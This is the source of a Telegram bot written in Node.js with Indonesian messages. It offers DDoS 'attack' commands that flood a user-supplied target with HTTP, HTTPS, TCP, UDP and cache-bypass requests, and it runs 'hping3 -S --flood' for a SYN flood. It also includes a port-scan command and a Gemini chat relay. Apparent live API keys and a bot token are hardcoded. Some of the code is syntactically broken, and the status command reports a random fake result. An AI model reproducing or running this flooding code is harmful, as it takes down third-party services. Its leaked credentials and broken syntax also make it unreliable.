const axios = require('axios');
const net = require('net');
const dgram = require('dgram');
const { exec } = require('child_process');

const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const token = '7837750888:AAGB6UF0DsqFZWGzwwXyGrrikg5gRPZ9PSg';
const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username ? '@' + msg.from.username : 'User';

  bot.sendPhoto(chatId, 'https://files.catbox.moe/n32cuk.jpg', {   
    caption: `
halo ${username} selamat datang di zerion official  :v

┏━⊱ informasi bot ⊱━┓
┃
┣➤ name : zerion
┣➤ developer 1 : @Zero
┣➤ developer 2 :  @Nanzztamvan
┣➤ version : 1.0
┃
┗━━━━━━━━━━━━━━━━━┛

⚡ note: command pake "/" ya

┏━⊱     MENU       ⊱━┓
┃
┣➤ attack <url> <time> <method>
┣➤ portscammer
┣➤ ai
┣➤ methodlist
┣➤ statusattack
┗━━━━━━━━━━━━┛
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: 'Attack', callback_data: 'attack' },
        ],
        [
          { text: 'Portscammer', callback_data: 'portscammer' },
          { text: 'AI', callback_data: 'ai' }
        ],
        [
          { text: 'Tools Tambahan', callback_data: 'tools' }
        ],
        [
          { text: 'Tutup Menu', callback_data: 'close' }
        ]
      ]
    }
  });
});

// Handle klik tombol
bot.on('callback_query', (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;
  const chatId = msg.chat.id;
  const chatType = msg.chat.type;

  if (data === 'attack') {
    bot.sendMessage(chatId, `Masukin URL target pake format:

/attack <target> <waktu> <method>

Contoh:
/attack https://example.com 60 HTTP-RAW`);
   } else if (data === 'portscammer') {
    bot.sendMessage(chatId, `Mau scan port? ketik:

/portscammer <ip target>

Contoh:
/portscammer 192.168.1.1`);
  } else if (data === 'ai') {
    bot.sendMessage(chatId, `Tanya apa aja ke AI!  
Format:

/ai <pertanyaan>

Contoh:
/ai siapa pembuat telegram?`);
  } else if (data === 'tools') {
    bot.sendMessage(chatId, `Tools tambahan tersedia:

• /iplookup <ip>
• /urlscan <url>
• /dnslookup <domain>

Mau pake yang mana? Gaskeun!`);
  } else if (data === 'close') {
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
      chat_id: chatId,
      message_id: msg.message_id
    });
    bot.sendMessage(chatId, 'Menu ditutup. Butuh bantuan tinggal /start lagi ya!');
  }
});


async function askGemini(prompt) {
  const apiKey = 'AIzaSyBZj8x-awSyJ1uDUtfrH843U7TJOHA-j2g';
  const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=${apiKey}`;

  const body = {
    contents: [{
      parts: [{ text: prompt }]
    }]
  };

  try {
    const response = await axios.post(url, body);
    return response.data.candidates[0].content.parts[0].text;
  } catch (error) {
    console.error('Error from Gemini:', error.response?.data || error.message);
    return 'Error: Tidak bisa dapet jawaban dari AI.';
  }
}

// ========================
// Fitur Attack, Methodlist, Statusattack
// ========================

// /attack command

bot.onText(/\/attack (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split(' ');

  if (args.length < 3) {
    bot.sendMessage(chatId, `Format salah, contoh:

/attack https://example.com 60 HTTP-RAW`);
    return;
  }

  const target = args[0];
  const time = parseInt(args[1]);
  const method = args[2].toUpperCase();
  const methods = ['HTTP-RAW', 'HTTPS', 'TCP', 'UDP', 'SYN', 'BYPASS'];

  if (!methods.includes(method)) {
    bot.sendMessage(chatId, `Method "${method}" gak ada! List method: ${methods.join(', ')}`);
    return;
  }

bot.sendPhoto(chatId, 'https://files.catbox.moe/4hq95o.jpg', {
  caption: 'Attack dimulai!',
}).then(() => {
  bot.sendMessage(chatId, `Attack Details:

• Target : ${target}
• Method : ${method}
• Durasi : ${time} detik

Attack dimulai! Tunggu hingga selesai...`);
});
  const endTime = Date.now() + time * 1000;

  if (method === 'HTTP-RAW') {
    const flood = setInterval(async () => {
      if (Date.now() > endTime) {
        clearInterval(flood);
        return;
      }
      try {
        await axios.get(target, {
          headers: {
            'User-Agent': 'Mozilla/5.0',
            'Accept': '*/*'
          },
          timeout: 5000
        });
        console.log(`HTTP-RAW attack sent to ${target}`);
      } catch (err) {
        console.error(`HTTP-RAW Error`);
      }
    }, 100);
  }

  else if (method === 'HTTPS') {
    const flood = setInterval(async () => {
      if (Date.now() > endTime) {
        clearInterval(flood);
        return;
      }
      try {
        await axios.get(target, {
          httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false }),
          headers: {
            'User-Agent': 'curl/7.64.1',
            'Accept': '*/*'
          },
          timeout: 3000
        });
        console.log(`HTTPS attack sent to ${target}`);
      } catch (err) {
        console.error(`HTTPS Error`);
      }
    }, 100);
  }

  else if (method === 'TCP') {
    const flood = setInterval(() => {
      if (Date.now() > endTime) {
        clearInterval(flood);
        return;
      }
      const host = target.replace('http://', '').replace('https://', '').split('/')[0];
      const socket = net.createConnection(80, host, () => {
        socket.write('Flood TCP Packet\r\n');
        socket.end();
        console.log(`TCP packet sent to ${host}`);
      });
      socket.on('error', () => {});
    }, 50);
  }

  else if (method === 'UDP') {
    const flood = setInterval(() => {
      if (Date.now() > endTime) {
        clearInterval(flood);
        return;
      }
      const host = target.replace('http://', '').replace('https://', '').split('/')[0];
      const message = Buffer.from('Flood UDP Packet');
      const client = dgram.createSocket('udp4');
      client.send(message, 0, message.length, 80, host, () => {
        client.close();
        console.log(`UDP packet sent to ${host}`);
      });
    }, 50);
  }

  else if (method === 'SYN') {
    bot.sendMessage(chatId, `SYN Attack jalan via command! (simulasi)`);

    const host = target.replace('http://', '').replace('https://', '').split('/')[0];
    const cmd = `hping3 -S --flood -V -p 80 ${host}`;

    const flood = exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.error(`SYN attack error: ${error.message}`);
        return;
      }
      console.log(`SYN Attack stdout: ${stdout}`);
    });

    setTimeout(() => {
      flood.kill();
    }, time * 1000);
  }

  else if (method === 'BYPASS') {
    const flood = setInterval(async () => {
      if (Date.now() > endTime) {
        clearInterval(flood);
        return;
      }
      try {
        const randomPath = Math.random().toString(36).substring(7);
        await axios.get(`${target}/${randomPath}`, {
          headers: {
            'User-Agent': `BypassBot/1.0`,
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
          },
          timeout: 3000
        });
        console.log(`BYPASS attack sent to ${target}`);
      } catch (err) {
        console.error(`BYPASS Error`);
      }
    }, 100);
  }
});


// /methodlist command
bot.onText(/\/methodlist/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendPhoto(chatId, 'https://files.catbox.moe/fzo3w4.jpg', {
  caption: 'Daftar method',
}).then(() => {
  bot.sendMessage(chatId, `Daftar method :

• HTTP-RAW
• HTTPS
• TCP
• UDP
• SYN
• BYPASS
`);
});

// /statusattack command
bot.onText(/\/statusattack/, (msg) => {
  const chatId = msg.chat.id;
  const status = ['Running', 'Processing', 'Completed'][Math.floor(Math.random() * 3)];

  bot.sendMessage(chatId, `Status attack saat ini: ${status}`);
});

// ========================
// Fitur Portscammer
// ========================

bot.onText(/\/portscammer (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetIp = match[1]; 

  if (!targetIp) {
    bot.sendMessage(chatId, 'Bro, IP targetnya mana? Kirim format: /portscammer <ip target>');
    return;
  }

  try {
    bot.sendMessage(chatId, `Scanning port buat IP: ${targetIp}... Tunggu bentar bro...`);

    
    const res = await axios.get(`https://api.hackertarget.com/nmap/?q=${targetIp}`);
    const hasilScan = res.data;

    if (hasilScan.includes('error')) {
      bot.sendMessage(chatId, 'Gagal scan bro. Mungkin IP-nya salah atau API-nya lagi limit.');
    } else {
      bot.sendPhoto(chatId, 'https://files.catbox.moe/bbxlwy.jpg', {
       caption: 'Hasil scan',
       }).then(() => {
      bot.sendMessage(chatId, `Hasil scan buat ${targetIp}:\n\n${hasilScan}`);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, 'Ada error pas scanning bro, coba lagi ntar.');
  }
});

bot.onText(/\/ai (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const prompt = match[1];

  try {
    await bot.sendChatAction(chatId, 'typing');
    await new Promise(resolve => setTimeout(resolve, 5000)); 

    const reply = await askGemini(prompt);
    bot.sendMessage(chatId, reply);
  } catch (error) {
    bot.sendMessage(chatId, 'Maaf, ada error pas nanya ke AI.');
  }
});
